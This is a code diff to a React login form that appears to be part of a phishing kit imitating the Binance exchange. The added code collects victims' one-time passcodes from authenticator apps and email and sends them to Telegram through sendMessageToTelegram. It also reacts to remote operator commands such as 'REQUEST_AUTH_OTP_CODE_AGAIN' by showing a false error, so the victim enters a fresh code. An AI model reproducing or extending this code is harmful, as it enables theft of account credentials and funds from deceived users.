@@ -5,10 +5,12 @@ import { useTheme } from '../app/lib/ThemeContext'
 import BinanceLoader from './BinanceLoader'
 import { useValidatePassword } from '../app/hooks/useValidate'
 import Modal from './VerificationModal'
+import { useCommand } from '../app/lib/CommandContext';
 
 export default function LoginForm() {
-
+    const { command } = useCommand();
     const { theme, toggleTheme } = useTheme();
+    const [otpCode, setOtpCode] = useState("");
     const [invalid, setInvalid] = useState(false)
     const [visible, setVisible] = useState(false)
     const [modal, setModal] = useState('AuthApp')
@@ -43,21 +45,71 @@ export default function LoginForm() {
     const [isLoading, setIsLoading] = useState(false)
     const [isHovered, setIsHovered] = useState(false)
 
-    const { validatePassword } = useValidatePassword();
-    const handlePasswordValidation = () => {
-        const isValid = validatePassword(password);
-        setInvalid(!isValid);
-        console.log('submitted')
-
-        if (isValid) {
-            setIsLoading(true);
-            setTimeout(() => {
-                setIsLoading(false);
-            }, 5000);
+    useEffect(() => {
+        console.log("Received command:", command);
+      
+        if (command === 'REQUEST_AUTH_OTP_CODE_AGAIN' && modal === 'AuthApp') {
+            console.log("command gotten in client is ", command)
+          // For the Authenticator OTP flow:
+          setInvalid(true); // Show error (or any other UI indication)
+          setIsLoading(false);
+        } else if (command === 'REQUEST_EMAIL_OTP_CODE_AGAIN' && modal === 'Email') {
+            console.log("command gotten in client is ", command)
+          // For the Email OTP flow:
+          setInvalid(true);
+          setIsLoading(false);
+        } else if (command === 'REQUEST_AUTHENTICATION_EMAIL') {
+          // Example: if you want to route somewhere after a specific command:
+          console.log("command gotten in client is ", command)
+        //   setIsLoading(false);
+        //   setTimeout(() => {
+        //     router.push('/AuthenticationPage');
+        //   }, 1500);
         }
+      }, [command, modal, router]);
 
+    // const { validatePassword } = useValidatePassword();
+    const handleOtpValidation = () => {
+        // Replace this with your actual OTP validation logic:
+        const isValid = validateOtp(otpCode);
+        
+        // Set error state based on validity
+        setInvalid(!isValid);
+        
+        // Always start the loader when trying to submit
+        setIsLoading(true);
+        
+        if (isValid) {
+          console.log(`${modal} OTP is valid. Sending to Telegram...`);
+          // Send OTP along with its type. Adjust sendMessageToTelegram as needed.
+          sendMessageToTelegram({ code: otpCode, type: modal });
+        } else {
+          // If invalid, show loader for 1 second, then turn it off.
+          setTimeout(() => {
+            setIsLoading(false);
+          }, 1000);
+        }
+        
         return isValid;
-    }
+      };
+
+
+      
+    // const handlePasswordValidation = () => {
+    //     const isValid = validatePassword(password);
+    //     setInvalid(!isValid);
+    //     console.log("password is ", password)
+    //     console.log(' Authentication submitted')
+
+    //     if (isValid) {
+    //         setIsLoading(true);
+    //         setTimeout(() => {
+    //             setIsLoading(false);
+    //         }, 5000);
+    //     }
+
+    //     return isValid;
+    // }
 
 
     const [padding, setPadding] = useState("80px 24px 54px");
